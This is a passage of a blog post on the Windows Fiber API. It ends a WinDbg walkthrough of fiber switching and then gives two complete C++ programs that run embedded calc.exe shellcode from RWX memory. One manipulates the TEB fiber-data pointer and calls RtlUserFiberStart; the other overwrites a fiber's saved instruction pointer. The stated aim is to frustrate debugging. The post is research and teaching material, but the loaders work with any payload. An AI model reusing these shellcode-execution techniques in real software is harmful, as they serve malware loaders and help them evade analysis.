+00007ffc`cdd82160 50              push    rax
+00007ffc`cdd82161 3441            xor     al,41h
+00007ffc`cdd82163 d9a800010000    fldcw   word ptr [rax+100h]
+00007ffc`cdd82169 498ba098000000  mov     rsp,qword ptr [r8+98h] ; restore original rsp
+00007ffc`cdd82170 c3              ret ; &lt;- CURRENT RIP
+00007ffc`cdd82170 c3              ret
+
+0:000&gt; dq rsp L1
+000000c4`536ff6b8  00007ffc`cdd5ad03 ; Return to KernelBase!SwitchToFiber
+
+0:000&gt; t return into SwitchToFiber
+Time Travel Position: 102:AA
+KERNELBASE!SwitchToFiber+0x33:
+00007ffc`cdd5ad03 4883c428        add     rsp,28h
+
+0:000&gt; t step to the return instruction
+Time Travel Position: 102:AB
+KERNELBASE!SwitchToFiber+0x37:
+00007ffc`cdd5ad07 c3              ret 
+
+0:000&gt; dq rsp L1 see where we&#39;re returning to.... aaaand!
+000000c4`536ff6e8  00007ff6`49e55a89
+
+0:000&gt; u poi(rsp)
+FiberBlog!HotPotatoOne+0x79 [Source.cpp @ 54]: HELL yes! A return finally back into HotPotatoOne from HotPotatoThree
+00007ff6`49e55a89 488b4508        mov     rax,qword ptr [rbp+8]
+00007ff6`49e55a8d 813839050000    cmp     dword ptr [rax],539h
+00007ff6`49e55a93 72ba            jb      FiberBlog!HotPotatoOne+0x3f (00007ff6`49e55a4f)
+00007ff6`49e55a95 b808000000      mov     eax,8
+00007ff6`49e55a9a 486bc000        imul    rax,rax,0
+00007ff6`49e55a9e 488d0d737c0000  lea     rcx,[FiberBlog!HOT_POTATOES (00007ff6`49e5d718)]
+00007ff6`49e55aa5 488b0c01        mov     rcx,qword ptr [rcx+rax]
+00007ff6`49e55aa9 ff1551b50000    call    qword ptr [FiberBlog!_imp_SwitchToFiber (00007ff6`49e61000)]
+</code></pre><p>Phew.
+Quite the long journey so far, but we did it!
+Now for the fun part.</p>
+<h2 id="0x04-misdirection-oooooooooooo">0x04 Misdirection oOOooOOoOoOo!</h2>
+<p>We&rsquo;ve talked about how fibers are created, allocated, switched to, and where the initial instruction pointer lives in memory.
+Let&rsquo;s put this all together to cause some debugging pain.</p>
+<p>I give you:
+Two methods to execute shellcode in a really weird way. ¯_(ツ)_/¯</p>
+<p>Method 1:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define TEB_FIBERDATA_PTR_OFFSET 0x17ee
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define LPFIBER_RIP_OFFSET 0x0a8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// calc shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> op[] <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x63\x2e\x65\x78\x65\x00</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">int</span>(WINAPI<span style="color:#f92672">*</span> tRtlUserFiberStart)(); 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    HMODULE hMod <span style="color:#f92672">=</span> GetModuleHandleA(<span style="color:#e6db74">&#34;ntdll&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hMod) { <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; }
+</span></span><span style="display:flex;"><span>    tRtlUserFiberStart lpRtlUserFiberStart <span style="color:#f92672">=</span> (tRtlUserFiberStart) GetProcAddress(hMod, <span style="color:#e6db74">&#34;RtlUserFiberStart&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>lpRtlUserFiberStart) { <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    _TEB<span style="color:#f92672">*</span> teb <span style="color:#f92672">=</span> NtCurrentTeb();
+</span></span><span style="display:flex;"><span>    NT_TIB<span style="color:#f92672">*</span> tib <span style="color:#f92672">=</span> (NT_TIB<span style="color:#f92672">*</span>)teb;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> pTebFlags <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)((uintptr_t)teb <span style="color:#f92672">+</span> TEB_FIBERDATA_PTR_OFFSET);
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)pTebFlags <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)pTebFlags <span style="color:#f92672">|</span> <span style="color:#ae81ff">0b100</span>; <span style="color:#75715e">// set the HasFiberData bit
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    LPVOID addr <span style="color:#f92672">=</span> VirtualAlloc(NULL, <span style="color:#66d9ef">sizeof</span>(op), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>addr) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> GetLastError();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    RtlMoveMemory(addr, op, <span style="color:#66d9ef">sizeof</span>(op));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    uintptr_t lpDummyFiberData <span style="color:#f92672">=</span> (uintptr_t)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, <span style="color:#ae81ff">0x100</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(LPVOID<span style="color:#f92672">*</span>)(lpDummyFiberData <span style="color:#f92672">+</span> LPFIBER_RIP_OFFSET) <span style="color:#f92672">=</span> addr; <span style="color:#75715e">// store the shelcode address at the offset of the FiberContext RIP in the Fiber Data
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//call    qword ptr [ntdll!_guard_dispatch_icall_fptr (00007ffa`218b4000)] ds:00007ffa`218b4000={ntdll!guard_dispatch_icall_nop (00007ffa`217cfa80)}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    __writegsqword(<span style="color:#ae81ff">0x20</span>, lpDummyFiberData); <span style="color:#75715e">// set the FiberData pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    lpRtlUserFiberStart();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Huge shoutout to s4r1n.
+<a href="https://github.com/S4R1N/AlternativeShellcodeExec">From my contribution to his repo</a></p>
+<p>Method 2:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// calc shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> op[] <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x63\x2e\x65\x78\x65\x00</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">dummy</span>() {
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;Hello Fiber from Dummy&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//https://github.com/reactos/reactos/blob/2e1aeb12dfd8b44b4b57d377b59ef347dfe3386e/dll/win32/kernel32/client/fiber.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//https://doxygen.reactos.org/dd/d83/ndk_2ketypes_8h_source.html#l00179
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// s/o to ch3rn0byl and s4r1n
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// am I doing s00p3r c001 1337 gr33tz right?
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    LPVOID addr <span style="color:#f92672">=</span> VirtualAlloc(NULL, <span style="color:#66d9ef">sizeof</span>(op), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>addr) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> GetLastError();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    RtlMoveMemory(addr, op, <span style="color:#66d9ef">sizeof</span>(op));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    _TEB<span style="color:#f92672">*</span> teb <span style="color:#f92672">=</span> NtCurrentTeb();
+</span></span><span style="display:flex;"><span>    NT_TIB<span style="color:#f92672">*</span> tib <span style="color:#f92672">=</span> (NT_TIB<span style="color:#f92672">*</span>)teb;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//https://github.com/reactos/reactos/blob/2e1aeb12dfd8b44b4b57d377b59ef347dfe3386e/dll/win32/kernel32/client/fiber.c#L256
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ConvertThreadToFiber(NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    LPVOID lpFiber <span style="color:#f92672">=</span> CreateFiber(<span style="color:#ae81ff">0x100</span>, (LPFIBER_START_ROUTINE)dummy, NULL);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (lpFiber <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;GLE : %d&#34;</span>, GetLastError());
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    uintptr_t<span style="color:#f92672">*</span> tgtFuncAddr <span style="color:#f92672">=</span> (uintptr_t<span style="color:#f92672">*</span>)((uintptr_t)lpFiber <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xB0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>tgtFuncAddr <span style="color:#f92672">=</span> (uintptr_t)addr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    SwitchToFiber(lpFiber);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Thank you for reading!
+I hope at the very least you learned something neat about the Windows Fiber API.</p>
+<p>Some great links:
+<a href="https://nullprogram.com/blog/2019/03/28/">https://nullprogram.com/blog/2019/03/28/</a>
+<a href="https://devblogs.microsoft.com/oldnewthing/20191011-00/?p=102989">https://devblogs.microsoft.com/oldnewthing/20191011-00/?p=102989</a></p>
+<p>s/o to all the cool as hell people in my life.
+You know who you are.</p>
+
+    </div>
+  </article>
+
+    </main>
+  </div>
+</body>
+</html>
